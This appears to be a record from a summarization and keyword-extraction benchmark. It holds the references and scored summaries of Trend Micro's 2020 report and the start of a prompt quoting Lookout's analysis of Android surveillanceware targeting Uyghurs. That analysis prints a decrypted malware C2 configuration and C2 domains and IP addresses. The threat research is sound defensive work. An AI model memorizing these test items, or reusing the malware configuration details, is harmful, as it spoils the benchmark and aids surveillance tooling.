and Ecular Xu. (Dec. 9, 2020). Trend Micro. \u201cSideWinder Uses South Asian Issues for SpearPhishing, Mobile Attacks.\u201d Accessed on Jan. 15, 2021, at url leverages-south-asian-territorial-issues-for-spear-ph.html.25 Mayra Rosario Fuentes. (May 26, 2020). Trend Micro. \u201cShifts in Underground Markets.\u201d Accessed on Feb. 5, 2021, at url Lawrence Abrams. (Jan. 12, 2019). Bleeping Computer. \u201cRyuk Ransomware Partners with TrickBot to Gain Access to Infected Networks.\u201d Accessed on Feb. 8, 2021, at url trickbot-to-gain-access-to-infected-networks/.27 Trend Micro. (Jan. 16, 2016). Trend Micro. \u201cOperation Pawn Storm: Fast Facts and the Latest Developments.\u201d Accessed onJan. 15, 2021, at url Feike Hacquebord and Lord Alfred Remorin. (Dec. 17, 2020). Trend Micro. \u201cPawn Storm\u2019s Lack of Sophistication asa Strategy.\u201d Accessed on Jan. 18, 2021, at url sophistication-as-a-strategy.html.29 Paul Miguel Babon. (Sept. 3, 2020). Trend Micro. \u201cTricky \u2018Forms\u2019 of Phishing.\u201d Accessed on Jan. 18, 2021, at url Catalin Cimpanu. (Feb. 10, 2020). ZDNet. \u201cFBI warns about ongoing attacks against software supply chain companies.\u201d Accessed on Feb. 10, 2021, at url chain-companies/.31 Federal Bureau of Investigation, Cyber Division. (March 30, 2020). SANS Internet Storm Center. \u201cKwampirs MalwareEmployed in Ongoing Cyber Supply Chain Campaign Targeting Global Industries, including Healthcare Sector.\u201d Accessed on Feb. 10, 2021, at url Jake Williams. (Dec. 15, 2020). SANS Institute. \u201cWhat You Need to Know About the SolarWinds Supply-Chain Attack.\u201dAccessed on Jan. 19, 2021, at url SolarWinds. (Dec. 31, 2020). SolarWinds. \u201cSolarWinds Security Advisory.\u201d Accessed on Jan. 19, 2021, at url Trend Micro. (Dec. 15, 2020). Trend Micro. \u201cOverview of Recent Sunburst Targeted Attacks.\u201d Accessed on Jan. 19, 2021, aturl David Klepper. (Oct. 17, 2020). Associated Press News. \u201cScammers seize on US election, but it\u2019s not votes they want.\u201dAccessed on Jan. 19, 2021, at url 2410451f45102ddd4a82ebec8ac746.36 Tom Burt. (Sept. 10, 2020). Microsoft. \u201cNew cyberattacks targeting U.S. elections.\u201d Accessed on Jan. 19, 2021, at url Trend Micro. (Aug. 26, 2020). Trend Micro. \u201cSecuring the Pandemic-Disrupted Workplace.\u201d Accessed on Jan. 19, 2021, aturl | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity Report38 Trend Micro. (Nov. 11, 2020). Trend Micro. \u201cDeveloping Story: COVID-19 Used in Malicious Campaigns.\u201d Accessed on Jan. 19, 2021, at url malware-file-names-and-malicious-domains.39 Andrew Duehren and Kristina Peterson. (Nov. 25, 2020). The Wall Street Journal. \u201cCovid-19 Aid and Stimulus: What\u2019s Expiring Soon and What\u2019s in the Works.\u201d Accessed on Jan. 19, 2021, at url soon-and-whats-in-the-works-11606311697.40 Internal Revenue Service. (Dec. 8, 2020). Internal Revenue Service. \u201cIRS warns people about a COVID-related text message scam.\u201d Accessed on Jan. 19, 2021, at url scam.41 Check Point. (Jan. 12, 2021). Check Point. \u201cCovid-19 \u2018Vaccines\u2019 Touted for Just $250 on Darknet.\u201d Accessed on Jan. 19,2021, at url Claire Zaboeva and Melissa Frydrych. (Dec. 3, 2020). IBM Security Intelligence. \u201cIBM Uncovers Global Phishing CampaignTargeting the COVID-19 Vaccine Cold Chain.\u201d Accessed on Jan. 19, 2021, at url uncovers-global-phishing-covid-19-vaccine-cold-chain.43 Marshall Chen et al. (Aug. 6, 2020). Trend Micro. \u201cWater Nue Phishing Targets Execs\u2019 Office 365 Accounts.\u201d Accessed on Jan.22, 2021, at url Cedric Pernet. (Oct. 6, 2020). Trend Micro. \u201cFrench companies Under Attack from Clever BEC Scam.\u201d Accessed on Jan. 22,2021, at url Trend Micro. (Oct. 7, 2020). Trend Micro. \u201cCSO Insights: DataBank\u2019s Mark Houpt on Looking Beyond Securing Infrastructures in the New Normal.\u201d Accessed on Jan. 19, 2021, at url cso-insights-databank-mark-houpt-on-looking-beyond-securing-infrastructures-in-the-new-normal.46 Yahoo!. (Nov. 24, 2020). Yahoo! Finance. \u201cVirtual Private Network (VPN) Market Report 2020: VPN Usage Spirals to an all TimeHigh of 27.1% - Global Forecast to 2027.\u201d Accessed on Jan. 19, 2021, at url network-vpn-market-100300294.html.47 Common Vulnerabilities and Exposures. (n.d.). Common Vulnerabilities and Exposures. \u201cCVE-2019-11510.\u201d Accessed on Jan.19, 2021, at url Eduard Kovacs. (Jan. 6, 2020). Security Week. \u201cPulse Secure VPN Vulnerability Exploited to Deliver Ransomware.\u201d Accessedon Jan. 19, 2021, at url Raphael Centeno. (Sept. 21, 2020). Trend Micro. \u201cCybercriminals Distribute Backdoor With VPN Installer.\u201d Accessed on Feb. 5,2021, at url Trend Micro. (Nov. 16, 2020). Trend Micro. \u201cMalicious Actors Target Comm Apps such as Zoom, Slack, Discord.\u201d Accessed on Jan. 19, 2021, at url comm-apps-such-as-zoom-slack-discord.51 Raphael Centeno, Bren Matthew Ebriega, and Llalum Victoria. (May 21, 2020). Trend Micro. \u201cBackdoor, Devil Shadow Botnet Hidden in Fake Zoom Installers.\u201d Accessed on Feb. 5, 2021, at url devil-shadow-botnet-hidden-in-fake-zoom-installers.html.52 Trend Micro. (Nov. 16, 2020). Trend Micro. \u201cMalicious Actors Target Comm Apps such as Zoom, Slack, Discord.\u201d Accessed on Jan. 19, 2021, at url comm-apps-such-as-zoom-slack-discord.53 Trend Micro. (2020). Trend Micro. \u201cThe 2020 Cyber Risk Index Goes Global.\u201d Accessed on Jan. 20, 2021, at url Trend Micro. (May 14, 2020). Trend Micro. \u201cCloud Security: Key Concepts, Threats, and Solutions.\u201d Accessed on Jan. 20,2021, at url and-solutions.55 Trend Micro. (April 7, 2020). Trend Micro. \u201cMisconfigured Docker Daemon API Ports Attacked for Kinsing Malware Campaign.\u201dAccessed on Feb. 5, 2021, at url docker-daemon-api-ports-attacked-for-kinsing-malware-campaign.44 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity Report56 Augusto Remillano II and Jemimah Molina. (May 6, 2020). Trend Micro. \u201cCoinminer, DDoS Bot Attack Docker Daemon Ports.\u201d Accessed on Jan. 20, 2021, at url bot-attack-docker-daemon-ports.57 David Fiser. (Dec. 18, 2020). Trend Micro. \u201cTeamTNT Now Deploying DDoS-Capable IRC Bot TNTbotinger.\u201d Accessed on Jan. 20, 2021 at url Alfredo Oliveira and David Fiser. (Oct. 12, 2020). Trend Micro. \u201cMetasploit Shellcodes Attack Exposed Docker APIs.\u201d Last accessed on Jan. 20, 2021, at url docker-apis.html.59 Vladimir Kropotov, Robert McArdle, and Fyodor Yarochkin. (Sept. 1, 2020). Trend Micro. \u201cCommodified CybercrimeInfrastructure: Exploring the Underground Services Market for Cybercriminals.\u201d Accessed on Jan. 20, 2021, at url trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/commodified-cybercrime-infrastructure-exploring-the- underground-services-market-for-cybercriminals.60 Vladimir Kropotov and Fyodor Yarochkin. (Nov. 16, 2020). Trend Micro. \u201cCybercriminal \u2018Cloud of Logs\u2019.\u201d Accessed on Jan. 24, 2021, at url emerging-underground-business-of-selling-access-to-stolen-data.61 Trend Micro. (Dec. 8, 2020). Trend Micro. \u201cTurning the Tide: Trend Micro Security Predictions for 2021.\u201d Accessed on Jan. 22,2021, at url Trend Micro. (Aug. 26, 2020). Trend Micro. \u201cSecuring the Pandemic-Disrupted Workplace.\u201d Accessed on Jan. 21, 2021, aturl Amine Amri et al. (2020). Forescout. \u201cAMNESIA:33 How TCP/IP Stacks Breed Critical Vulnerabilities in IoT, OT and IT Devices.\u201dAccessed on Jan. 22, 2021, at url vulnerabilities-in-iot-ot-and-it-devices.64 Amine Amri et al. (2020). Forescout. \u201cAMNESIA:33 How TCP/IP Stacks Breed Critical Vulnerabilities in IoT, OT and IT Devices.\u201dAccessed on Jan. 22, 2021, at url vulnerabilities-in-iot-ot-and-it-devices.65 Trend Micro. (Sept. 13, 2016). Trend Micro. \u201cLinux Security: A Closer Look at the Latest Linux Threats.\u201d Accessed on Feb. 9, 2021, at url the-latest-linux-threats.66 Augusto Remillano II and Jemimah Molina. (July 8, 2020). Trend Micro. \u201cNew Mirai Variant Expands, Exploits CVE-2020-1017.\u201d Accessed on Jan. 20, 2021, at url exploits-cve-2020-10173.html.67 Fernando Merces, Augusto Remillano II, and Jemimah Molina. (July 28, 2020). Trend Micro. \u201cMirai Botnet Attack IoT Devices via CVE-2020-5902.\u201d Accessed on Jan. 20, 2021, at url iot-devices-via-cve-2020-5902.html.68 Zhengyu Dong. (Nov. 9, 2020). Trend Micro. \u201cAn Old Joker\u2019s New Tricks: Using Github To Hide Its Payload.\u201d Accessed on Jan.21, 2021, at url html.69 Vit Sembera. (Dec. 3, 2020). Trend Micro. \u201cFrom Geost to Locker: Monitoring the Evolution of Android Malware Obfuscation.\u201dAccessed on Jan. 21, 2021, at url evolution.html.70 National Institute of Standards and Technology. (n.d.). National Vulnerability Database. \u201cVulnerability Metrics.\u201d Accessed onFeb. 5, 2021, at url Common Vulnerabilities and Exposures. (n.d.). Common Vulnerabilities and Exposures. \u201cCVE-2020-1472.\u201d Accessed on Jan.22, 2021, at url Ophtek, LLC. (n.d.). Ophtek. \u201cZerologon is the Latest Microsoft Vulnerability.\u201d Accessed on Feb. 10, 2021, at url Trend Micro. (n.d.). Trend Micro. \u201cWhat is Zerologon?.\u201d Accessed on Jan. 22, 2021, at url | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity Report74 Trend Micro. (n.d.). Trend Micro. \u201cWhat is Zerologon?.\u201d Accessed on Jan. 22, 2021, at url Microsoft. (Aug. 8, 2020). Microsoft. \u201cNetlogon Elevation of Privilege Vulnerability (CVE-2020-1472).\u201d Accessed on Jan. 22,2021, at url Lindsey O\u2019Donnell. (Jan. 15, 2021). Threatpost. \u201cMicrosoft Implements Windows Zerologon Flaw \u2018Enforcement Mode\u2019.\u201dLast accessed on Feb. 10, 2021, at url mode/163104/.77 FireEye, Inc and Ponemon Institute LLC. (2021). Respond Software. \u201cSecond Annual Study on the Economics of Security Operations Centers: What is the True Cost for Effective Results?\u201d Accessed on Jan. 19, 2021, at url cloudfront.net/wp-content/uploads/2021/01/Ponemon-Institute-FireEye-Second-Annual-Study-Economics-of-the-SOC-2021. pdf.78 Trend Micro. (Feb. 10, 2017). Trend Micro. \u201cBest Practices: Identifying and Mitigating Phishing Attacks.\u201d Accessed on Jan. 24,2021, at url mitigating-phishing-attacks.79 Trend Micro. (Oct. 25, 2018). Trend Micro. \u201cVirtual Patching: Patch Those Vulnerabilities before They Can Be Exploited.\u201dAccessed on Jan. 22, 2021, at url patching-patch-those-vulnerabilities-before-they-can-be-exploited.80 Trend Micro. (Feb. 25, 2020). Trend Micro. \u201cThe Sprawling Reach of Complex Threats.\u201d Accessed on Jan. 21, 2021, at url | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportTREND MICROTM RESEARCH Trend Micro, a global leader in cybersecurity, helps to make the world safe for exchanging digital information.Trend Micro Research is powered by experts who are passionate about discovering new threats, sharing key insights, and supporting efforts to stop cybercriminals. Our global team helps identify millions of threats daily, leads the industry in vulnerability disclosures, and publishes innovative research on new threat techniques. We continually work to anticipate new threats and deliver thought-provoking research.www.trendmicro.com ", "generated_text": "Trend Micro; 2020; a year; attacks; targeted ransomware; attacks; critical industries; sectors; healthcare; government; manufacturing; Covid-19; the year; phishing; social engineering; trends; use; supply chain attacks; supply chain attacks; phishing campaigns; payloads; a rapid-fire rise; evolutions; targeted attacks; tactics; attacks; techniques; Run; the rise; Egregor; DoppelPaymer; the report; threat actors; the threat landscape; the year; the threat landscape; the same threat actor; groups; the report; the threats; organizations; their cybersecurity.", "ref_text": "<START-1>The report provides an overview of the cyberthreat landscape in 2020 and highlights major trends and security issues that affected organizations globally. It focuses on the rise of sophisticated ransomware attacks targeting critical industries, the impact of COVID-19 and remote work on cybersecurity, emerging threats in cloud, IoT and mobile environments, dangerous new vulnerabilities, and the need for comprehensive defense strategies and multilayered security technologies. Key points: - Targeted ransomware attacks continued against prominent organizations in healthcare, manufacturing, finance and government sectors. Ryuk, Egregor and DoppelPaymer were among the prominent ransomware families. Operators used double extortion techniques and increasingly targeted Linux systems. - Phishing remained a dominant threat despite its simplicity, as actors customized URLs for targets. Business email compromise (BEC) also continued, often using COVID-19 themes, though overall BEC volume declined 17% year-over-year. - Supply chain attacks emerged as a means to circumvent target security, highlighted by the major SolarWinds Orion attack. - COVID-19 themes were used extensively, comprising most 2020 BEC subject lines. 16M+ pandemic-related attack detections included spam, phishing and malware. - Remote work increased reliance on VPNs and cloud services, but also exposed organizations to risks from misconfigurations and credential theft. - IoT and mobile threats increased, including router compromise and new Android malware obfuscation techniques, though mobile malware app volumes declined 41%. - 1,453 new vulnerabilities were disclosed, up 40%, including spikes in critical and high severity flaws. Old bugs remained exploited. - The report emphasizes need for layered security combining technologies, strategies and policies to defend today's complex environments against sophisticated, determined actors. <END-1>", "t5/keyword/hint_hit_precision": 0.42857142857142855, "t5/word/hint_hit_recall": 0.09266409266409266, "gpt3/lexical/rouge_rouge1": 0.4033149171270718, "gpt3/lexical/rouge_rouge2": 0.14444444444444443, "gpt3/lexical/rouge_rougeL": 0.20441988950276244, "gpt3/lexical/rouge_rougeLsum": 0.20441988950276244, "gpt3_generated_text": ["The Trend Micro 2020 Annual Cybersecurity Report highlights the major cybersecurity trends and threats that occurred throughout the year. Targeted ransomware attacks focused on critical industries such as healthcare, government, and manufacturing, with newer ransomware families like Egregor and DoppelPaymer conducting highly damaging operations. Phishing and social engineering tactics remained prevalent, with constant evolutions in techniques. Supply chain attacks became a popular strategy for threat actors, exemplified by the SolarWinds Orion software breach. The report emphasizes the need for organizations to adapt to a threat landscape in constant flux, with comprehensive defense strategies and multilayered security technologies to protect against increasingly complex attacks."]}, {"split_name": "val", "sample_id": "val_75", "prompt_text": "Extract the keywords: SECURITY RESEARCH REPORTMobile APT Surveillance Campaigns Targeting UyghursA collection of long-running Android tooling connected to a Chinese mAPT actorJune 2020GoldenEagleFindingsMalware detailsGoldenEagle and CarbonSteal convergence29293233C2 infrastructure and connections with other malware 34About LookoutAcknowledgementsAppendix A: Targeted countries373738Appendix B: Indicators of compromise 40ContentsExecutive SummaryKey FindingsSilkBeanFindingsTargetingMalware details367789Command and control infrastructure and possible 11 distribution mechanismsConnections to other Uyghur-targeted 12 surveillancewareDoubleAgentFindingsMalware details181819DoubleAgent connection to other malware families 22CarbonStealFindingsMalware detailsCarbonSteal C2 infrastructure and APT 15 links23232426Executive SummaryThe Lookout Threat Intelligence team has discovered four Android surveillanceware tools, which are used to target the Uyghur ethnic minority group. Our research indicates that these four interconnected malware tools are elements of much larger mAPT (mobile advanced persistent threat) campaigns that have been active for years. Although there is evidence that the campaigns have been active since at least 2013, Lookout researchers have been monitoring the surveillanceware families \u2014 SilkBean, DoubleAgent, CarbonSteal and GoldenEagle \u2014 as far back as 2015.The mAPT threat actors behind this activity possess a mobile arsenal containing at least four other Android surveillance tools publicly known as HenBox1, PluginPhantom2, Spywaller3 and DarthPusher4. By examining the surveillanceware apps, their signing certificates and supporting command and control (C2) infrastructure, we have discovered connections between these malware tools and the actors behind them which we detail in this report.Evidence suggests that some of the mAPT activity described in this report is also publicly associated with desktop APT activity in China5, a theme which is increasingly common with mobile malware tooling.Lookout researchers have evidence to suggest that while the main target of this activity is indeed the Uyghur ethnic minority in China, these tools have also been used to target Uyghurs living outside China, Tibetans, and Muslim populations around the world.Titles and in-app functionality suggest targets speak a variety of languages including: Uyghur (in all its four scripts: Arabic, Russian, Uyghur Cyrillic and Chinese), English, Arabic, Chinese, Turkish, Pashto, Persian, Malay, Indonesian, Uzbek and Urdu/Hindi.The development timeline and targeting of these families also appear to align with Chinese national security directives and \u201ccounter-terrorism\u201d efforts as defined by the Chinese government, perhaps suggesting a broader strategic goal behind the campaign. Lookout researchers have observed a peak in malware development beginning in 2015, which coincides with the \u201cStrike Hard Campaign against ViolentTerrorism\u201d () campaign inXinjiang that began in May 2014, as well as the creation of the National Security Strategic Guidelines, the National Security Law and the Counterterrorism Law in 20156.Additionally, the languages, countries, and services that were observed targeted by the mAPT are in line with China\u2019s official list of \u201c26 Sensitive Countries,\u201d which according to public reporting, has been used by Chinese authorities as targeting criteria. During our research, we found evidence of at least 14 of the 26 countries being targeted by the malware campaigns discussed in this report.1 url url url url url url url showing the countries targeted by the mAPT activity discussed in this report.Users of the Lookout mobile security products are protected from all these threats. According to our data, none of the malicious apps covered by this report here were available on Google Play.A sample of DoubleAgent has previously been reported to target the Tibetan people8 and evidence found in our investigation suggests the surveillanceware classified as GoldenEagle may also target the same group. While SilkBean is a relatively small and targeted family for Uyghur individuals, shared infrastructure between SilkBean and DoubleAgent suggests that the two are operated by the same actor and have been for many years. That same infrastructure has also been seen communicating with samples of the malware families CarbonSteal, HenBox, PhantomPlugin, Spywaller and DarthPusher.8 url samplesHenBoxFireEye GREF reportSigned samplesC2SilkBeanSharedinfrastructureDoubleAgentSigning certi\ufb01catesShared C2 IP deliveringXSLCmd malwareShares C2 IP addressC2SpywallerGoldenEagleShared uniqueWeChat IDSigned samplesCarbonStealUnique code overlapMap showing the countries targeted by the mAPT activity discussed in this report.Lookout researchers have connected these four novel and publicly unknown Android surveillance tools together in the ways shown above. Themalware activity primarily targets the Uyghur ethnic group. These families share command and control (C2) infrastructure, signer certificates,and overlapping code structure, indicating common developers and much larger ongoing malware campaigns. Some C2 infrastructure is alsoassociated with publicly reported APT activity on the use of the XSLCmd backdoor9 associated with GREF.9 url FindingsFour new Android surveillanceware tools have been discovered by Lookout.\u2022 DoubleAgent and GoldenEagle also target Tibetans, inferred from their titles as well as public reporting.10\u2022 Application titles have also been seen in at least 10 different languages - Uyghur (in all its four scripts: Arabic, Russian, Uyghur Cyrillic and Chinese), English, Arabic, Chinese, Turkish, Pashto, Persian, Malay, Indonesian, Uzbek and Urdu/Hindi.All four malware families are connected to each other through shared command and control infrastructure, signing certificates as well as code and target overlap.\u2022 Samples of DoubleAgent, GoldenEagle and SilkBeanshare C2 infrastructure indicating that the same actor is behind the deployment of these malware tools.\u2022Infrastructure publicly associated with the actor known as GREF in 2018 has been found to be linked directly to CarbonSteal samples. In past public reporting, GREF has also been referred to as APT15, Ke3chang, Mirage, Vixen Panda and Playful Dragon.\u2022 Overlap of non-compromised signing certificatesindicates that a combination of these tools are being used in tandem by a single group of mAPT actors to target Uyghurs and other Muslim populations around the world.\u2022 The primary aim of these surveillanceware apps is togather and exfiltrate personal user data to a command and control server.\u2022 The apps fall into four separate malware families, eachof which has its own unique data gathering priorities and techniques. We named these families SilkBean, DoubleAgent, CarbonSteal and GoldenEagle.\u2022 Lookout researchers can trace some of the associatedinfrastructure as far back as 2013, along with changes in tooling.\u2022 These surveillanceware tools have been used inconjunction with previously reported malware families such as HenBox, PluginPhantom, Spywaller and Darth Pusher.Targets of these malware families are primarily Uyghurs, both in China and around the world, but also include Tibetans and possibly wider Muslim communities.\u2022 Application titles and in-app functionality of the malwaresamples suggest the targets of all four surveillanceware families are the Uyghur Muslim ethnic minority group, centered in Xinjiang, China. Some applications and C2 domains appear to impersonate third-party Uyghur language app stores and focus on Uyghur-targeted apps and services.\u2022 Evidence suggests Uyghur communities in at leastfourteen other countries may also be targeted. Content within malware samples reference local services and news outlets in countries such as Turkey, Syria, Kuwait, Indonesia and Kazakhstan.10 url In January 2019, Lookout researchers began investigating SilkBean, a small and targeted Android surveillanceware tool focusing on the Turkic minority ethnic group, the Uyghurs. The malware samples mainly trojanized applications for Uyghur/Arabic focused keyboards, alphabets, and plugins.A hallmark of SilkBean is the comprehensive RAT (remote access trojan) functionality that allows an attacker to execute over 70 different commands on an infected device. SilkBean is delivered via applications that possess malicious functionality, but mimic titles and icons that a target may want to install. The legitimate app with functionality the user expects is packaged within the malware and installed after SilkBean successfully infects a target device.Tracking SilkBean throughout 2019 led to the discovery that the actor behind this malware had a much larger Android toolset than was previously thought, and had also perhaps expanded their target group. Malware samples connected by common command and control infrastructure over a number of years suggests that the same group behind the activity of SilkBean was also making use of the malware families known as DarthPusher11, HenBox12, PluginPhantom13 and the next surveillanceware family presented here: DoubleAgent.The languages used in the titles and in-app content include: Uyghur (in all its four scripts: Arabic, Russian, Uyghur Cyrillic, and Chinese), English, Arabic, Chinese, Turkish, Pashto, Persian, Malay, Indonesian, and Urdu/Hindi. Locations referenced in these titles also point to individuals living in or visiting countries such as Syria, Kuwait, Indonesia and Turkey. Many topics reference either popular Muslim apps or applications that individuals who are interested in Islam might find entertaining. Other titles and domains reference legitimate services, websites and third party app stores that serve Uyghur-relevant content only.Logging statements indicate that the developers of SilkBean speak Chinese. Chinese names and locations are also mentioned in non-compromised signer certificates used to sign samples of this malware, although this information is easy to falsify during development. Similarities in coding techniques and naming conventions between SilkBean and other known Chinese-developed malware families also add weight to this theory.11 url url url The majority of SilkBean samples acquired by Lookout in 2016 and 2017 have titles like com.google.pay and com.android. google.service, which the average user might find innocuous on an Android device. Most later samples had app icons and titles identifying them as Uyghur targeted as shown in the following figure.While at least two samples have a direct reference to Uyghur specific applications, such as Uyghur Keyboard, (Uyghur) Alphabet and Uyghur Plugin, one is titled \u201c \u201d which may be loosely translated as \u201cIndependence\u201d in Arabic. Another recent sample is titled TalkBox, a push- to-talk messaging application commonly used in China.\u0644\u0644\u0627\u0642\u0649\u062a\u0633\u0649\u0626A SilkBean sample (SHA-1: 3da34aaf95ffcb5c5d36c2a9fc5 42c1b08c36d2f) uncovered in June 2019 prompted a closer look at the family. It had the title \u201c \u201d, which translates to \u201cSyria News\u201d in Arabic. Despite the app title, the content of the application was still specifically Uyghur-focused - all news stories could be viewed in the three different scripts used for the Uyghur language.\u0627\u064a\u0631\u0648\u0633 \u0631\u0627\u0628\u062e\u0627Icons and screenshots ofSilkBean samples which areexamples of language-specifictargeting used by this threat,where the same news article ispresented in a number of Uyghurlanguage scripts.8Screenshots from a sample ofSilkBean masquerading as aUyghur Keyboard application.The first stage of the applicationasks the user for an updateimmediately and uses thisopportunity to install anotherapplication which containslegitimate functionality, alsoretrieved from it\u2019s assets folder(non-rooted device functionality).The application does not attemptto hide its icon either. As isdiscussed later however, thecurrent C2 content encouragesusers to disable this securitysetting and allow app installsfrom unknown locations.Malware details Apps belonging to the SilkBean family have extensive surveillance and remote-control capabilities as is evident from the following list of 70 commands the app can receive from its C2 and perform.CMD_ADDRESSBOOK CMD_WATCHAPP_RECORD_SYNThe list of all commands that can be received and processed by SilkBean samples. Note the get and delete commands for Weibo information on an infected device, which is a popular social media site in China.9Many samples of SilkBean had most of their malicious functionality in a second stage and read command and control information from a settings file in the assets folder.{\u201cApp_run_name\u201d:\u201d\u201d, \u201cAram_type\u201d:\u201dtrue\u201d, \u201cmm_path\u201d:\u201dC:\\\\Program Files (x86)\\\\ryingsoft\\\\mmserver\\\\data\\\\center\\\\mm\\\\9365e76b-f9e3-4ac7-881f-c93ab1077a60.apk\u201d,\u201cMm_type\u201d:0, \u201cother_path\u201d:\u201dC:\\\\Program Files (x86)\\\\ryingsoft\\\\mmserver\\\\data\\\\center\\\\mm\\\\aa42b5bb-f43e-4841-80cd-917680909614.apk\u201d,\u201cPort\u201d:7082, \u201cRs_type\u201d:\u201d3\u201d, \u201cserver_ip\u201d:\u201dwww.turkyedu-online.com\u201d, \u201cSock_type\u201d:0, \u201cUpdate_config\u201d:\u201cCall_type\u201d:2431, \u201cCyc_time\u201d:\u201d60\u201d, \u201cSave_path\u201d:\u201dc:\\\\auto_path\u201d, \u201cScreen_state\u201d:1, \u201cStart_time\u201d:\u201d22:00\u201d, \u201cStop_time\u201d:\u201d23:00\u201d, \u201cTime_type\u201d:1, \u201ctrans_type\u201d:\u201dWIFI ONLY\u201d}, \u201cUse_weixin\u201d:0, \u201cversion\u201d:\u201d2016-02-18new\u201d{}Top: Files seen in the assets folder of a sample of SilkBean. The file 112 is a sqlite database used to store some data for the application. The file 113 is the second stage and contains malicious functionality. com.kittyhomes.uyghurinputkeyboard is the application that contains legitimate functionality and setting.prop is the encrypted file containing C2 information. Bottom: In all cases, this settings file is encrypted using a set of bitwise shifting operations. Once decrypted, it contains a JSON Object, similar to the one shown above. The values of the \u201cmm_path\u201d and SilkBean samples are www.englishedu-online[.]com and www.turkyedu-online[.]com. Navigating to these sites early on in the investigation redirected the request to a third-party app store called www.islamapk[.]com which hosts Uyghur and Islamic specific applications for download.More recently however, navigating to these sites directs the user to an exact copy of url an adult content site, which also resolves to the same IP address as the SilkBean C2s. Site content encourages users to modify Android security settings, thereby allowing the installation of applications from an \u201cUnknown Source\u201d.All applications offered on this site (SHA-1: with a compromised key, but do not appear to contain any malicious functionality consistent with SilkBean and also do not have surveillanceware capabilities. However, all three applications have the capability to install an application package. This is a behavior explicitly explained away by the content on the web site as an expected \u201cupdate\u201d of the app. This behavior might provide insight into a possible distribution mechanism for the malicious apps.Lastly, accessing either of the C2 servers over an HTTPS connection again redirected the user to islamapk[.]com. However, the site content delivered on this site appeared to impersonate yet another third-party app store, yurdax[.] com. It is possible that the targets for SilkBean may already be familiar with this site and this made infecting their devices with SilkBean easier.A screenshot taken during the investigation of url which is exactly identical in content to http:// yurdax[.]com/android/.None of the APKs downloaded from the site during the investigation were malicious, although a significant fraction of the links were either not accessible or the target files did not exist. Lookout also began ingesting the same APKs foundon SilkBean C2 servers from other sources shortly before new samples of SilkBean started appearing in August 2018. The temporal correlation suggests that the site and malware campaign were being updated in parallel.11Lookout researchers also uncovered six applications requesting invasive permissions that connect to islamapk[.] com, with very telling package names as to who is being targeted. Two of the applications are known SilkBean samples, while the remaining are not yet classified into any known families, but appear to look for a second stage download from islamapk[.]com, which at the time of writing could not be accessed. Two of the applications\u2019 package names are com.uyghur.hunter.islamapk, and the other two are com.islamapk.uy, which is consistent with the targeting of Uyghurs that Lookout researchers have seen.Connections to Other Uyghur-targeted SurveillancewareThe detailed investigation into SilkBean apps and infrastructure provided the starting point for piecing together the different elements of this mAPT into a larger picture. Starting from the IP address (213.128.81[.]82) of the two previously mentioned C2 servers of SilkBean (www. englishedu-online[.]com and www.turkyedu-online[.]com) we found that a number of similar C2 servers had also resolved to the same IP address. This resolution has not changed since January 2016 (for turkyedu-online[.]com) and October 2017 (for www.englishedu-online[.]com).A Maltego graph showing the resolutions of SilkBean\u2019s C2 domains to the IP addresses 213.128.81[.]82 and 31.210.106[.]90 as well as someother domains resolving to the same IPs since February 2016. This image was compiled using RiskIQ\u2019s Passive DNS data. OSINT15 and RiskIQ16 research indicates that uyghurappbazar[.]com and overxtube[.]com are already publicly associated with Android malware17. Many sites have a naming convention with the pattern \u201c*edu-online.com\u201d and the rest appear to contain innocuous names or reference Uyghur-specific content, communicating with domains seen in the above graph, a C2 domain pattern \u201c*edu-online.com\u201d emerged as a common theme for many associated domain names this actor has made use of. From this, Lookout researchers uncovered hundreds ofsamples communicating with these domains, not all of which are SilkBean surveillanceware. In fact, the majority of these downloaded samples belong to malware from the families DarthPusher, HenBox and PluginPhantom.SilkBean C2Domainsenglishedu-online.comC2 infrastructureexploration leadingto new domainsturkyedu-online.comnew*edu-online.comdomains204 New ApplicationsPhantomPluginHenBoxDarth PusherFlowchart highlighting the connection from SilkBean infrastructure to new APK samples tied to three other malware families, DarthPusher,PhantomPlugin and HenBox.DarthPusher18 is classified by Lookout as an app dropper, i.e. malware with capability that can arbitrarily install an Android APK. An adversary can use this capability to push any piece of surveillanceware to an intended target device.PluginPhantom19, or IHide, was found to contain many separate Android applications hidden within its resources. Each surveillance function of the malware, such as collecting call logs, location, SMS messages and more, was divided into separate APKs that were then loaded through the \u201cDroidPlugin\u201d framework for Android. Location tracking functions used only Baidu libraries and most debuggingstatements appeared to be in Chinese. Lookout researchers also noticed overlap with other Chinese-developed code from IronButler and SpyWaller malware, which continues the trend of heavily reusing already existing malware tooling by the actor behind SilkBean.HenBox20,21, is a previously discovered surveillanceware already known to target the Uyghur community. We can only attribute a small subset of these apps to the SilkBean actor through the use of shared infrastructure and the similarity of the used domains to the previously mentioned pattern.18 url url url url record history links a number of these domains together, through the emails,, andBranching out from WHOIS information, C2 domains, and IP resolutions, Lookout researchers were able to find other potential C2 domains in use by the actor behind this tooling using the same targets and patterns. The majority ofknown C2 servers were registered with Xin Net Technology Corporation, a Chinese domain provider that has a reputation for hosting phishing and malicious sites22, and eNom23. All others were hosted by Hetzner24.22 url url url domain nameLanguage of apps 00Malware familiesNotescookedu-online[.]comArabic and ChineseHenBox, DarthPusher, DoubleAgentbabyedu-online[.]comUyghur and PashtoDoubleAgent, GoldenEagleMostly focused on people practicing Islam.The use of Pashto titles may indicate targeting of people in Afghanistan and Pakistan25.newkidedu-online[.]com swimedu-online[.]comN/ADarthPusher, HenBoxOverlaps with DarthPusher.highschooledu-online[.] comEnglish, Pashto, and UyghurHenBoxfrancedu-online[.]comArabic, Uzbek, English and ChinesePluginPhantomenglishedu-online[.]comEnglishSilkBean, DarthPusherturkyedu-online[.]comUyghur and ArabicSilkBean, DarthPusherTargeting newcomers to Turkey who speak English, with titles such as \u201cTurkey Navigation\u201d and \u201cCities of Turkey\u201d; also secure messaging and VPN apps (Psiphon, Zapya and Voxer).Domain names suggest possible targets in France.Mostly apps focussing on people practicing Islam. Also secure messaging apps such as TalkBox.\u0627\u064a\u0631\u0648\u0633 \u0631\u0627\u0628\u062e\u0627\u0644\u0644\u0627\u0642\u0649\u062a\u0633\u0649\u0626App titles \u201c \u201d (Syria News), \u201c \u201d (Independence) third-party app stores and secure messaging. Targeting Uyghurs and people in Syria26. Continued 